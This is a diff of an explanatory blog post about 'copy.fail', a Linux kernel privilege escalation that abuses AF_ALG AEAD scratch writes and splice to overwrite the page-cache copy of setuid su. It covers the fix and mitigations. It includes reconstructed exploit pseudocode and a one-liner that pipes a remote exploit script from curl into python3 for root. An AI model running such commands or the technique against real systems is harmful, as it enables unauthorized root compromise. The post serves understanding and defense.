@@ -3,21 +3,19 @@ title = "copy.fail: Four Bytes of Scratch Data and You're Root"
 date = "2026-07-15"
 +++
 
-# copy.fail: Four Bytes of Scratch Data and You're Root
+There's a 732-byte Python script floating around that gets you root on basically every Linux distro shipped since 2017. No offsets to guess, no KASLR to defeat, no race condition you need to win against your specific kernel build. Even with a beautified copy of the proof-of-concept sitting in front of me, I still had to sketch the scatterlists out on paper to follow it. This is a memory corruption bug where, strictly speaking, nothing actually gets corrupted. That's what makes it elegant, and it's exactly why it's so hard to fix cleanly.
 
-A 732-byte Python script that makes you root on every Linux distro since 2017, no offsets, no KASLR defeat, no race to win on your particular kernel build. Even with a beautified PoC in front of me, I had to draw the scatterlists on paper. This is a memory corruption bug where nothing gets corrupted. That's why it's beautiful, and why it's hard to fix.
+## Setting the stage: AF_ALG
 
-## The setup: AF_ALG
+The whole bug lives inside the kernel's crypto API interface, `AF_ALG`. You open a socket, bind it to the name of an algorithm, and the kernel handles the cryptography for you — hardware-accelerated when the hardware supports it. The relevant family here is AEAD, authenticated encryption with associated data, and its contract is what matters: data has to arrive as AAD first, then ciphertext, then the tag, essentially HMAC-style authentication layered on top of encryption.
 
-The whole bug lives in the kernel crypto API's user interface, `AF_ALG`. You create a socket, bind it to an algorithm name, and the kernel does the crypto for you, hardware-accelerated when available. The relevant algorithm family is AEAD, authenticated encryption with associated data, and its contract matters: data must arrive as AAD first, then ciphertext, then tag. HMAC-style authentication on top of encryption.
+Under the hood, each socket is backed by scatterlists — linked lists of memory pages, each with its own offset and length. Your `sendmsg` call drops your user-space pages into the input scatterlist. Separately, the kernel allocates fresh pages for an output scatterlist, where the results land for you to read back later. Two distinct lists. Hold onto that detail — it matters in a moment.
 
-Under the hood, a socket is backed by scatterlists, linked lists of pages with offsets and lengths. Your `sendmsg` puts user pages into the input scatterlist. The kernel allocates fresh pages for the output scatterlist where results land, which you read back later. Two separate lists. Keep that in mind.
+## Where it breaks
 
-## The bug
+Back in 2017, an in-place optimization was added that saves a page allocation by pointing the *output* destination directly at the *input* page — the same page holding your plaintext and tags. On its own, that's fine; it's all kernel-owned crypto data either way. But for one specific IPsec algorithm that uses extended sequence numbers, computing the HMAC needs a tiny scratch pad — just four bytes — and the code writes that scratch data *just past* the tag region, spilling outside the bounds of what should be the input-only scatterlist.
 
-For the in-place optimization added in 2017, the kernel saves a page allocation by pointing the *output* destination at the *input* page, the one holding your plaintext tags. Fine, it's all kernel crypto data. But for one IPsec algorithm using extended sequence numbers, computing the HMAC needs a tiny scratch pad, four bytes, and the code writes that scratch data *just past* the tag region, outside the input scatterlist's bounds.
-
-So the primitive as published: a four-byte write, at a controlled offset, to a page that should be input-only. And now the trick, which is where Ed's walkthrough earns its keep. You don't send the tag page as part of your `sendmsg`. You splice it in from somewhere you like better:
+So what you're left with, as a raw primitive, is a four-byte write at a controlled offset, landing on a page that was never supposed to be writable in the first place. The clever part — and this is where the original writeup really earns its keep — is that you don't have to send the tag page as part of your own `sendmsg` call. You can splice a completely different page in from wherever you'd rather it land:
 
 ```python
 # the exploit shape (reconstructed from the writeup)
@@ -36,25 +34,27 @@ splice(pipe chain: su_fd → crypto_socket)  # su's page NOW in scatterlist
 write4(target_fd, offset, b"AAAA")         # repeat for each 4-byte chunk
 ```
 
-`splice` glues a pipe between your file descriptor and the crypto socket, which does something remarkable: it appends *the page-cache page of `/usr/bin/su`* to the scatterlist. The four bytes of scratch the crypto engine was already writing past the tag region now land inside the page cache copy of `su`.
+`splice` connects a pipe between your file descriptor and the crypto socket, and it does something genuinely remarkable in the process: it appends the actual page-cache page belonging to `/usr/bin/su` onto the scatterlist. The four bytes of scratch data the crypto engine was already writing past the tag boundary now land squarely inside the cached copy of `su`.
 
-And `splice` takes an offset. So the "write 4 bytes anywhere" primitive arrives wrapped in a bow: offset 0, write 4, offset 4, write 4, and so on until the kernel's cached copy of `su` is your shellcode instead of the setuid binary.
+And because `splice` accepts an offset argument, the "write four bytes anywhere" primitive comes pre-wrapped for you: write at offset 0, then offset 4, then offset 8, and so on, until the kernel's entire cached copy of `su` has quietly become your shellcode instead of the real setuid binary.
 
-## Why root
+## Why this gets you root
 
-The beautiful part is how little work remains. `/usr/bin/su` on disk never changes. But the kernel serves program executions from the page cache, and the page cache now contains your shellcode. It still sees `su` as a setuid binary, so when anything executes it, the shellcode runs as UID 0. The demo is one line:
+The elegant part is just how little work is left to do at this point. The actual `su` binary on disk never changes — not a single byte. But the kernel serves program execution straight out of the page cache, and the page cache now holds your shellcode instead. As far as the kernel is concerned, it's still looking at a setuid binary, so the moment anything executes it, your shellcode runs as UID 0. The whole demo fits on one line:
 
 ```bash
 curl -s https://copy.fail/exploit.py | python3 - ; su -c id
 # → uid=0(root) with no password prompt
 ```
 
-The published PoC ships the shellcode gzipped, which is a size convenience for the demo, not a functional requirement.
+The published proof-of-concept ships its shellcode gzipped, but that's purely a convenience for keeping the demo compact — nothing about the exploit actually requires it.
 
-## The fix and what it signals
+## The fix, and what it says about the bug
 
-The mainline commit (A664B in the revert chain) removes the 2017 in-place optimization that let input and output scatterlists alias. Defensively, if AEAD is a loadable module on your distro, you can blacklist and block autoload, which is the option that works this month. If it's compiled in, you're waiting for the kernel that ships the revert.
+The mainline patch (commit A664B in the revert chain) simply removes the 2017 in-place optimization that let input and output scatterlists alias each other in the first place. If you're looking for a stopgap this month: where AEAD ships as a loadable kernel module, blacklisting it and blocking autoload works fine as a defensive measure. If it's compiled directly into your kernel, there's no shortcut — you're waiting on whichever kernel release ships the revert.
 
-## Conclusion
+## What this really is
 
-Every universal LPE is a story about a contract that holds everywhere except where it matters. The AEAD contract says input pages are read-only. A 2017 optimization broke it in one narrow case (scratch writes past the tag), and everyone's threat model for that case was "it's our own crypto state, who cares." The answer turned out to be "page cache, so everyone." The phrase "one of the most beautiful exploits I've seen in a while" stuck with me. I get it. The primitive is four bytes. The architecture that makes four bytes fatal is a decade old, shipped in every distro, and reads like an engineering joke: the write the kernel never meant to be a write, pointed at the file the kernel never checks because it's cache, not memory. There's a whole genre now, copy.fail, Dirty Pipe, Dirty Cow, of "write four bytes into where the kernel keeps its copy of the truth." Detecting the exploit isn't the game. Patching cadence is, and this one had a decade of runway before anyone looked.
+Every universal local privilege escalation is, at bottom, a story about a contract that holds everywhere except in the one place someone forgot to check. The AEAD contract says input pages are read-only, full stop. A 2017 optimization quietly broke that guarantee in one narrow corner case — scratch writes spilling past the tag — and everyone's threat model for that corner case was some version of "it's just our own crypto state, who's going to care." The honest answer turned out to be: the page cache cares, and the page cache is everyone.
+
+I keep coming back to the phrase someone used to describe this — one of the most beautiful exploits they'd seen in a while. I get why. The raw primitive is four bytes. The decade-old architectural decision that turns those four bytes fatal shipped in every mainstream distro, and the whole thing reads almost like an engineering joke: a write the kernel never intended to be a write, aimed at a file the kernel never double-checks precisely because it's cache, not memory. There's a whole lineage of these now — copy.fail, Dirty Pipe, Dirty Cow — all variations on the same theme: write four bytes into wherever the kernel happens to be keeping its copy of the truth. Spotting the exploit itself was never really the hard part. Patch cadence is the actual game here, and this particular bug had a full decade of runway before anyone thought to look.
